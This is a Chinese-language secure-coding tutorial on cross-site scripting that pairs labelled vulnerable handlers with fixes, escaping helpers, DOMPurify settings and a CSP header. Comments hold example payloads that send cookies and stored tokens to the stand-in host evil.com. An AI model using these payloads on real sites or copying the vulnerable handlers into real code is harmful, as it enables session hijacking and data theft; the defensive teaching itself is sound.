XSS 跨站脚本攻击

核心概念

跨站脚本攻击（Cross-Site Scripting, XSS）是 Web 应用中最常见也最危险的安全漏洞之一。攻击者通过在目标网站注入恶意脚本代码，使其在其他用户的浏览器中执行，从而窃取用户数据、劫持会话、篡改页面内容甚至传播恶意软件。XSS 攻击之所以危险，是因为浏览器无法区分合法脚本和注入脚本——它们拥有完全相同的执行权限。

根据注入方式和存储位置的不同，XSS 攻击分为三种主要类型：反射型（Reflected）、存储型（Stored）和 DOM 型（DOM-based）。

反射型与存储型 XSS
反射型 XSS 的恶意代码存在于 URL 中，服务端未经转义直接回显到响应中：


// 危险：服务端直接回显 URL 参数
app.get('/search', (req, res) => {
  const query = req.query.q;
  // 攻击者构造: /search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
  res.send(`<h1>搜索结果: ${query}</h1>`); // 恶意脚本被执行
});

// 安全：对输出进行 HTML 转义
import { escapeHtml } from './utils';

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>搜索结果: ${query}</h1>`);
});
存储型 XSS 将恶意代码持久化到数据库中，所有访问该页面的用户都会受到攻击：


// 危险：用户评论未经净化直接存储并展示
app.post('/comments', async (req, res) => {
  await db.comments.create({ content: req.body.content });
  // 攻击者提交: <img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('token'))">
});

app.get('/comments', async (req, res) => {
  const comments = await db.comments.findAll();
  const html = comments.map((c) => `<div class="comment">${c.content}</div>`).join('');
  res.send(html); // 所有用户加载时触发恶意代码
});

// 安全：入库前净化 + 出库时转义（双重防护）
import DOMPurify from 'isomorphic-dompurify';

app.post('/comments', async (req, res) => {
  const sanitized = DOMPurify.sanitize(req.body.content);
  await db.comments.create({ content: sanitized });
});
DOM 型 XSS
DOM 型 XSS 完全在客户端发生，恶意代码通过 JavaScript 操作 DOM 时被注入，不需要服务端参与：


// 危险：直接将 URL 片段插入 DOM
const hash = window.location.hash.substring(1)
document.getElementById('content')!.innerHTML = hash
// 攻击者构造: https://example.com/page#<img src=x onerror=alert(document.cookie)>

// 危险：常见的 DOM XSS 注入点
document.write(userInput)              // 直接写入文档
element.innerHTML = userInput          // HTML 解析注入
element.outerHTML = userInput          // 同上
element.insertAdjacentHTML('beforeend', userInput)
eval(userInput)                        // 代码执行
setTimeout(userInput, 0)               // 代码执行
new Function(userInput)()              // 代码执行
element.setAttribute('onclick', userInput)  // 事件处理器注入

// 安全：使用 textContent 或安全的 DOM API
const hash = window.location.hash.substring(1)
document.getElementById('content')!.textContent = hash  // 纯文本，不解析 HTML

// 安全：React 默认转义 JSX 表达式
const UserProfile: FC<{ name: string }> = ({ name }) => {
  return <div className="profile">{name}</div>  // React 自动转义
}

// 危险：React 中的 dangerouslySetInnerHTML
const RawContent: FC<{ html: string }> = ({ html }) => {
  // 如果必须使用，先净化
  const clean = DOMPurify.sanitize(html)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
防御策略体系
XSS 防御需要采用纵深防御策略，在多个层面同时实施：


const escapeHtml = (str: string): string => {
  const escapeMap: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, (char) => escapeMap[char]);
};

const escapeForAttribute = (str: string): string => {
  return str.replace(/[^\w.-]/g, (char) => {
    return `&#x${char.charCodeAt(0).toString(16)};`;
  });
};

const escapeForJs = (str: string): string => {
  return JSON.stringify(str);
};

import createDOMPurify from 'dompurify';

const purify = createDOMPurify(window);

const sanitizeRichText = (dirty: string): string => {
  return purify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
    ADD_ATTR: ['target'],
  });
};

const sanitizeUrl = (url: string): string => {
  try {
    const parsed = new URL(url);
    if (!['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
      return '';
    }
    return parsed.href;
  } catch {
    return '';
  }
};
CSP（Content Security Policy）是 XSS 的最后防线：


app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    [
      `default-src 'self'`,
      `script-src 'self' 'nonce-${nonce}'`,
      `style-src 'self' 'unsafe-inline'`,
      `img-src 'self' data: https:`,
      `connect-src 'self' https://api.example.com`,
      `frame-ancestors 'none'`,
      `base-uri 'self'`,
      `form-action 'self'`,
    ].join('; '),
  );

  next();
});
框架级防护
现代前端框架提供了内置的 XSS 防护机制：


// React：默认转义所有 JSX 表达式中的值
const SafeComponent: FC<{ userInput: string }> = ({ userInput }) => {
  return (
    <div>
      <p>{userInput}</p> {/* 安全：自动转义 */}
      <a href={sanitizeUrl(userInput)}>链接</a> {/* 需手动验证 URL */}
    </div>
  );
};

// Vue: 默认转义 {{ }} 模板表达式
// <template>
//   <p>{{ userInput }}</p>           <!-- 安全：自动转义 -->
//   <div v-html="sanitized"></div>   <!-- 需要手动净化 -->
// </template>

const useSafeHtml = (dirty: string): string => {
  return useMemo(
    () =>
      DOMPurify.sanitize(dirty, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'code'],
        ALLOWED_ATTR: ['href', 'target'],
      }),
    [dirty],
  );
};

const SafeMarkdown: FC<{ content: string }> = ({ content }) => {
  const html = useSafeHtml(content);
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
};
小结
    

  • XSS 是 Web 应用最常见的安全漏洞，分为反射型、存储型和 DOM 型三种
    • 

  • 反射型通过恶意 URL 参数触发，存储型将恶意代码持久化到数据库
    • 

  • DOM 型完全在客户端发生，通过 JavaScript 操作 DOM 时注入
    • 

  • 防御应采用纵深策略：输入验证 → 输出转义 → CSP → 框架内置防护
    • 

  • 现代框架（React/Vue）默认转义模板表达式，但 dangerouslySetInnerHTML/v-html 需要手动净化
    • 

  • DOMPurify 是前端 HTML 净化的首选库，支持白名单配置
    • 

  • CSP 是 XSS 的最后防线，通过限制脚本来源阻止注入代码执行
    • 

  • URL 处理时必须验证协议（protocol），防止 javascript: 协议注入
    •
